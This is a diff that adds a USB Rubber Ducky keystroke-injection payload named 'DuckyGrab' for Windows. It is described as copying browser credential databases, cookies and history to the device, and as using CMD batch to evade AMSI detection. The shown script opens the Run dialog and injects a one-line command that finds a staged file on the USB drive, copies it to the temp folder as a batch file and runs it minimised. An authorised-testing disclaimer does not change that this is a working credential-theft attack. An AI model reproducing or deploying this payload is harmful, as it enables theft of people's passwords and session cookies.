@@ -1,0 +1,33 @@
+REM_BLOCK DOCUMENTATION
+    Title:    DuckyGrab
+    Author:   LTFZP
+    Target:   Windows 11 (also works on Windows 10)
+    Version:  2.0
+    Category: Exfiltration
+
+    Description:
+        Copies browser credential databases, cookies, bookmarks and
+        history from Chromium browsers (Chrome, Edge, Brave) and
+        Firefox to the DUCKY USB storage for offline analysis.
+        Uses CMD batch instead of PowerShell to avoid AMSI detection.
+        Staged script stored as s.dat on the DUCKY.
+
+    Requirements:
+        - Target must be logged in at desktop
+        - s.dat must be on the DUCKY root alongside inject.bin
+        - Compile this payload with PayloadStudio
+
+    Legal:
+        For AUTHORIZED penetration testing and security audits ONLY.
+END_REM
+
+DEFINE #BOOT_DELAY 3000
+
+ATTACKMODE HID STORAGE
+DELAY #BOOT_DELAY
+GUI r
+DELAY 700
+STRING cmd /c "for %d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do @if exist %d:\s.dat (copy %d:\s.dat %tmp%\r.bat >nul 2>nul & start /min cmd /c %tmp%\r.bat & exit)"
+ENTER
+DELAY 30000
+LED_G
